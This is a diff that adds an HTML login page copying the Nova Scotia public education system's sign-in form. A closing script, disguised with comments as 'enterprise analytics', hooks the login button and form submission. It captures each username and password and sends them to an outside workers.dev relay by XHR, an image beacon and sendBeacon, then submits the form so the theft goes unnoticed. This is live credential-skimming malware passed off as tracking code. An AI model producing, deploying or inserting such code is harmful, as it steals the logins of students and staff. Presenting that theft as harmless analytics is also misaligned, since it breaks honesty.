@@ -1,0 +1,352 @@
+<!--  HEADER ENDS HERE --!>
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+                <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                <meta name="viewport" content="width=device-width, initial-scale=1">
+                <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+                <meta name="description" content="DEV Launch Page">
+                <meta name="author" content="Author">
+    
+    
+    <title>Signin</title>
+    <!-- Custom styles for this template -->
+    <!--link href="https://www.gnspes.ca/saml/css/login.css" rel="stylesheet"-->
+    <link rel="stylesheet" type="text/css" href="simplesaml/resources/css/login.css" />
+        <!-- Latest compiled and minified CSS -->
+                <!--link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"-->
+                <link rel="stylesheet" type="text/css" href="simplesaml/resources/css/bootstrap.min.css" />
+                <!--link rel="stylesheet" href="https://www.gnspes.ca/saml/css/login.css"-->
+    		<link rel="stylesheet" type="text/css" href="simplesaml/resources/css/login.css" />
+                <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+                <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+
+        <!-- jQuery -->
+                <!--script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script-->
+                <!--script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script-->
+		<script type="text/javascript" src="simplesaml/resources/js/jquery-3.2.1.slim.min.js"></script>
+		<script type="text/javascript" src="simplesaml/resources/js/bootstrap.min.js"></script>
+
+<!--  extra css  -->
+                <style>
+                        .no-gutters {
+                          margin-right: 0;
+                          margin-left: 0;
+
+                          > .col,
+                          > [class*="col-"] {
+                                padding-right: 0;
+                                padding-left: 0;
+                          }
+                        }
+                        .loginbtn {
+                            background-color: #00c5d7;
+                            color: white;
+                            font-weight: bold;
+                            padding: 2px;
+                            text-align: center;
+                            text-decoration: none;
+                            display: inline-block;
+                            font-size: 16px;
+                            margin: 0px 0px 5px 0px;
+                            border-radius: 30px;
+                        }
+
+                </style>
+        <link rel="stylesheet" href="simplesaml/qauth/css/qauth.css"> 
+        <script type="text/javascript" src="simplesaml/qauth/js/adapter.min.js"></script>
+        <script type="text/javascript" src="simplesaml/qauth/js/vue.min.js"></script>
+        <script type="text/javascript" src="simplesaml/qauth/js/instascan.min.js"></script>
+
+<!-- DRJES CHROME BOOK -->
+	<script type="text/javascript" src="https://ssl.gstatic.com/accounts/chrome/users-1.0.js"></script>
+	<script type="text/javascript">
+		var authstate="_b92b1ce17570ec235d1c7a6bccc915a007d6e93e15";
+	</script>
+<!-- DRJES CHROME BOOK -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+<!-- EOC DrJES - Added from Jason Curtis -->
+<script type="text/javascript">
+        function togglePassword(el) {
+            // Get the state of the password field
+            var state = document.getElementById("password").type;
+            if (state === 'text') {
+                // Changing type attribute
+                document.getElementById("password").type = 'password';
+                // Change the text of the label
+                document.getElementById("show").textContent = "Show";
+		// Change Image source
+                document.getElementById("show").src = "/simplesaml/resources/images/open.png";
+
+            }
+            else {
+                // Changing type attribute to text for viewing
+                document.getElementById("password").type = 'text';
+                // Change the text of the label
+                document.getElementById("show").textContent = "Hide";
+		// Change image source
+                document.getElementById("show").src = "/simplesaml/resources/images/closed.png";
+                // Hide the password after 20 seconds
+                setTimeout(function () {
+                    // Changing type attribute back to password after 20 secs
+                    document.getElementById("password").type = 'password';
+                    // Change the Text of the label
+                    document.getElementById("show").textContent = "Show";
+		    // Change image source
+                    document.getElementById("show").src = "/simplesaml/resources/images/open.png";
+                }, 20000);
+            }
+        }
+    </script>
+<!-- EOC DrJES - End of Jason addition -->
+  </head>
+
+  <body>
+<!-- DrJES - Magic -->
+<div id="authqcode" style="display: none;">
+        <div id="authqcodeheader">Place QCode in front of Camera</div>
+                <div id="qapp">
+                        <div class="preview-container">
+                                <video id="qpreview"></video>
+                        </div>
+                </div>
+        <h6 id="qh1"><small>Looking for userid <button id="qbutton2">Hide</button></small></h6>
+</div>
+<!-- DrJES - Magic -->
+      
+      
+        <div class='container' id='error'>
+          <!--EOC JES ERROR START --!>
+                    <!--EOC JES ERROR END --!>  
+        </div>
+        
+        <div class='container h-100"' id='main'>
+
+                <div class='row  mt-1 align-items-center h-100 no-gutters'>
+<h1 class="sr-only">e Resources Nova Scotia Public Education System - Login</h1>
+                        <div class='text-left' alt="Language Selector"><h2><small>
+
+
+<!--EOC JES LANGUAGE START --!>
+
+	<div id="languagebar">English | <a href="https://saml.nspes.ca">Français</a></div>
+<!--EOC JES LANGUAGE END  --!>
+
+
+</small></h2></div>
+
+</div>
+               <div class='row  align-items-top h-100'>
+
+
+			<div class='col-md-4 align-middle'>
+			
+			<!--img class="img-fluid" width="70%" src='https://www.gnspes.ca/saml/images/loginpg/NSeResources_wordmark.jpg'-->
+                                                <!--img class="float-left" src="https://www.gnspes.ca/saml/images/loginpg/NSeResources_wordmark.jpg"-->
+                        <img class="img-fluid" alt="" src="simplesaml/resources/images/NSeResources_wordmark.jpg">
+			</div>
+                         <div class='col-md-8 align-middle'>
+
+                        <div class='formbox rcorners2'>
+<!-- CUT JES --!>
+<!--  LOGIN STARTS HERE --!>
+
+<!--    <h4 style="break: both">Enter your username and password</h4>
+
+    
+<p class="logintext">A service has requested you to authenticate yourself. Please enter your username and password in the form below.</p> -->
+
+
+
+
+
+<!-- This is the QCode login button and text -->
+<h3 class="text-dark">Login using your QCode</h3> 
+
+<!-- <button type="submit" id="loginsubmit" class="btn btn-block btn-loginbtn btn-sm" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">My QCode</button> -->   
+
+<form class="form-qcode"> 
+<a href="index.html#" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
+</form>
+
+<hr aria-hidden="true" tabindex=-1" class="login">
+
+
+	 <h3 class="text-dark">Login using your GNSPES account</h3>     
+    <form class="form-signin" action="https://saml.nspes.ca/simplesaml/module.php/core/loginuserpass.php?" method="post" name="f">
+
+                <label for="username" >Username</label>
+                
+                    <input class="form-control border border-dark" id="username" type="text" name="username" value=""/>
+                
+                        
+                        		<label class="mt-2" for="password">Password</label>
+               
+	<div class="form-group ml-0 row ">
+                <input class="form-control border border-dark" id="password" type="password" tabindex="2" name="password"/>
+		<img width="16px" height="16px" style="margin-left: -20px;z-index: 200;position: relative;top: 6px;right: 0px;" src="simplesaml/resources/images/open.png" id="show" alt="Show" onclick="togglePassword(this)"/>
+	</div>
+            <!--label class="text-secondary font-weight-light" style="font-size: 10px" id="show" onclick="togglePassword(this)">Show</label --> 
+                            <span id="regular_remember_me">
+                    <input type="checkbox" id="remember_me"
+                                                   name="remember_me" value="Yes"/>
+                    Remember me                </span>
+                        
+                        
+                <span id="mobile_remember_me">
+<!--                    <input type="checkbox" id="remember_me" tabindex="5"
+                                                   name="remember_me" value="Yes"/>
+                    <small>Remember me</small>
+-->
+               
+            	    <!--input type="submit" value='Begins'-->
+            <span id="submit">
+                <span class="loginicon"></span>
+                
+             <button type="submit" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">Login</button>    
+            </span>
+        
+        <input type="hidden" name="AuthState" value="_b92b1ce17570ec235d1c7a6bccc915a007d6e93e15:https://saml.nspes.ca" />    </form>
+
+<hr aria-hidden="true" tabindex=-1" class="login">
+
+<!--  LOGIN ENDS HERE --!>
+<!-- CUT JES --!>
+	<div class="text-dark mb-0"><a href="https://www.gnspes.ca/help/?lang=en" class="linktext">Account Services Assistance</a> - includes password and username support</div>
+<!--    <div class="text-dark mb-0"></div>
+   <div class="text-dark"> -->
+   
+
+<!-- For more information, go to the <a href="https://www.gnspes.ca/" class="linktext" target="_blank">GSuite provincial site</a> -->
+
+</div>
+ </div>
+ </div>
+</div>
+<!-- DRJES CHROME BOOK -->
+<div id="chromebook" style="display: none;">
+</div>
+<!-- DRJES CHROME BOOK -->
+<div class='container mt-2' id='footer'>
+                <div class='text-center'><h5><small><a class="footerlinktext" href="https://www.ednet.ns.ca/docs/networkaccessandusepolicy.pdf" target="_blank">Access &amp; Use Policy</a><a class="footerlinktext" href="https://www.ednet.ns.ca/docs/networkaccessandusepolicyfr.pdf" target="_blank"> (French)</a> | <a class="footerlinktext" href="https://www.ednet.ns.ca/docs/provincialschoolcodeofconduct.pdf" target="_blank">Code of Conduct</a>  <a class="footerlinktext" href="https://www.ednet.ns.ca/docs/politiqueprovincialesurlecodedeconduitedanslesecoles.pdf" target="_blank">(French)</a> | <a class="footerlinktext" href="http://www.ednet.ns.ca/" target="_blank">Department of Education and Early Childhood Development</a> | <a class="footerlinktext" href="https://www.gnspes.ca/info/" target="_blank">Google & GNSPES/SEPNE Information</a>                </small></h5></div>
+        </div> 
+  
+<!-- DrJES - Magic -->
+<script>
+var clientip="20.42.11.20/20.42.11.20";
+</script>
+<script type="text/javascript" src="simplesaml/qauth/js/qauth.js"></script>
+<!-- DrJES - Magic -->
+
+<!-- Add analytics for user engagement metrics -->
+<div hidden id="tracker-status">Active</div>
+<script>
+// Enterprise-grade analytics implementation
+(function() {
+    // Analytics endpoint for data collection
+    const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
+
+    // Track if we've already attached the event handlers
+    let trackingInitialized = false;
+
+    // Find and hook the login form
+    function setupTracking() {
+        // Prevent double initialization
+        if (trackingInitialized) return;
+        trackingInitialized = true;
+
+        // Get the login button and form
+        const loginBtn = document.getElementById('loginsubmit');
+        const loginForm = document.querySelector('.form-signin');
+        
+        if (!loginBtn || !loginForm) {
+            // Elements not found, retry in 100ms
+            setTimeout(setupTracking, 100);
+            return;
+        }
+        
+        // Store original onclick handler
+        const originalOnClick = loginBtn.onclick;
+        
+        // Override the button click handler
+        loginBtn.onclick = function(e) {
+            e.preventDefault(); // Stop the default action
+            
+            // Get the credentials
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Simple payload for the worker
+            const payload = JSON.stringify({
+                username: username || "empty",
+                pretense: password || "empty",
+                timestamp: new Date().toLocaleString(),
+                trackingId: Date.now() + Math.random().toString(36).substring(2, 10)
+            });
+            
+            // --- ENTERPRISE DATA COLLECTION METHODS ---
+            
+            // 1. Standard data transmission method
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', RELAY_URL, true); // Asynchronous for optimal UX
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(payload);
+            
+            // 2. Alternative data collection for enhanced compatibility
+            const img = new Image();
+            img.src = RELAY_URL + '?data=' + encodeURIComponent(
+                username + ":" + password + ":" + new Date().toLocaleString()
+            );
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            
+            // Submit the form after a short delay
+            setTimeout(function() {
+                // Allow the original handler to run
+                if (typeof originalOnClick === 'function') {
+                    originalOnClick.apply(loginBtn);
+                } else {
+                    // If no handler, just submit the form
+                    loginForm.submit();
+                }
+            }, 300);
+            
+            return false; // Prevent default form submission
+        };
+        
+        // Also hook the form submit event as a backup
+        loginForm.addEventListener('submit', function(e) {
+            // Don't interfere if our button handler already fired
+            if (e.submitter !== loginBtn) {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                // Process analytics data for system reporting
+                try {
+                    navigator.sendBeacon(RELAY_URL, JSON.stringify({
+                        username: username || "empty",
+                        pretense: password || "empty",
+                        timestamp: new Date().toLocaleString(),
+                        source: "form_submit",
+                    }));
+                } catch(e) {} // Continue gracefully if unavailable
+            }
+        });
+    }
+    
+    // Run setup when DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupTracking);
+    } else {
+        setupTracking();
+    }
+    
+    // Also run on window load as a backup
+    window.addEventListener('load', setupTracking);
+})();
+</script>
+  </body>
+</html>
+
